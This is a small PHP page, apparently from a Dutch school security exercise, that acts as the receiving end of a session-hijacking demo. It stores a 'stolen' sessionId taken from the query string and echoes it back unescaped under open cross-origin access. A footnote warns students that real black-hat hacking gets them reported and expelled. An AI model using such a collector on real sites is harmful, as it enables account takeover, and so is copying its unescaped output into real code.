<?php
    header("Access-Control-Allow-Origin: *");
    // Enable Cross Origin posting, bron: https://enable-cors.org/server_php.html

    require_once('db/connect.php');
    require_once('db/sessie-functies.php');
    $sessionId = $_GET['sessionId'];
    saveSessionId($dbh, $sessionId);
?>
<!doctype html>
<html lang="nl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport"
              content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <title>Hack 'em all</title>
    </head>
    <body>
        <h1>Hack 'em all :P <sup>*</sup></h1>
        <p>Gestolen sessionId: <?= $sessionId ?>.</p>
        <p style="font-size: 4px;"><sup>*</sup>Allemaal stoere taal, maar echt hacken is natuurlijk niet grappig (en
            studenten die zich hier echt bezig houden met black hat hacking rapporteren we bij de politie en worden van
            de HAN | ICA
            afgezet (en
            inline css mag je niet laten staan))!</p>
    </body>
</html>
